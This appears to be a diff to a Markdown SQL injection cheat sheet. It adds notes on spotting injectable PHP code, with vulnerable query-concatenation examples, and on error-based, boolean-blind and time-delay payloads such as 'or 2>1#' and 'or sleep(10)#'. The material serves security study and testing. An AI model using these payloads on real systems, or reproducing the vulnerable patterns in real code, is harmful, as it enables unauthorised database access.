@@ -53,13 +53,43 @@ Ex: SELECT * FROM information_schema.columns WHERE table_name = 'TABLE_NAME'; <b
 
 # Order by <br>
 1. The ORDER BY keyword is used to sort the result-set in ascending or descending order. But these keywords are used to identify no of columns present in table. <br>
-Ex: SELECT * FROM Customers ORDER by 7; /* if there are 6 columns in table this query gives SQL error. */ <br>
+Ex: SELECT * FROM Customers ORDER by 7; /* if columns are less than 7 in the table. query gives SQL error. Check on less than 7 values until error resolved.  */ <br>
 
-# Time Delay
+# Time Delay <br>
 Ex 1: SELECT sleep(10)  /* Sleep for 10 sec */ <br>
 Ex 2: SELECT IF(CONDITION-HERE,sleep(10),'a'  /* Sleep for 10 sec if codition is True*/ <br>
 
+# Detecting SQL Injection <br>
+Case 1: When source code is available. <br>
+Try to find out dynamic query where user inputs are concatenating to SQL query without/partial sanitizing user's input. Some time developer does mistake to concatenate user input into query while using parameterize SQL query. <br>
+Ex 1: <br>
+$username = $_POST["username"]; <br>
+$password = $_POST["password"]; <br>
+$sql="SELECT * FROM users WHERE username = '$username' AND password = '$password'"; <br>
+$result = mysql_query($sql, $link); <br>
+<br>
+Ex 2: parameterized query <br>
+$firstname = $_POST["firstname"]; <br>
+$lastname = $_POST["lastname"]; <br>
+$email = $_POST["email"]; <br>
 
-
+$stmt = $conn->prepare("INSERT INTO MyGuests (firstname, lastname, email) <br>
+VALUES ($firstname, :lastname, :email)"); /* Userinput "firstname" is directly concatenated into quey. So snippet is vulnerable to SQL Injection */  <br>
+$stmt->bindParam(':lastname', $lastname); <br>
+$stmt->bindParam(':email', $email); <br>
+<br>
+Case 2: Black box error based SQL Injection <br>
+1. single quote('), double quote("), and(&), semicolon(;), double dash(--) any character that break the SQL syntax. SQL server return Syntex error to end user. <br>
+  Ex : $sql="SELECT * FROM users WHERE username = ''' AND password = '$password'";  /* gives syntax error */ <br>
   
+Case 3. Blind SQL Injection (Conditional) <br>
+1. App return data based on True/False condition <br>
+Ex 1: "SELECT * FROM books WHERE bookid = -2 or 2>1# <br>
+Ex 2: "SELECT * FROM books WHERE bookid = -2 or 2>1 LIMIT 1# /* Return 1st result only */ <br>
+<br>
+Case 4: Blind SQL Injection (Time delay) <br>
+1. App return data after delaying certain time <br>
+Ex 1: "SELECT * FROM books WHERE bookid = -2 or sleep(10)#; <br>
+2. Condition time delay <br>
+Ex 2. SELECT IF(1=1,sleep(10),'a'); <br>
     
